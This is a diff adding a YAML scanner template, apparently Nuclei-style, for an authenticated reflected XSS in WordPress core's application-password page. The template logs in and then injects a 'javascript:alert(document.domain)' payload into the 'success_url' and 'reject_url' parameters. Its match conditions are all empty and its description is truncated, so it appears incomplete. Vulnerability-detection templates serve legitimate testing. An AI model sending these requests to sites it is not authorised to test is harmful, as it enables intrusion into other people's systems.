@@ -1,0 +1,30 @@
+id: application-pass-xss
+brief:
+    title: WordPress Core 5.6 and 6.3.1 - Cross-Site Scripting
+    by: nqdung2002
+    level: medium
+    about: WordPress Core is vulnerable to Reflected Cross-Site Scripting via the 'success_url' and 'reject_url' parameters when requesting application passwords in versions between 5.6 and 6.3.1 due to insuf...
+    label:
+        - wpscan
+        - wp
+        - wordpress
+        - authenticated
+        - xss
+        - vuln
+    score: CVSS:6.1
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/authorize-application.php?success_url=javascript%3Aalert%28document.domain%29&reject_url=javascript%3Aalert%28document.domain%29'
+      signs: []
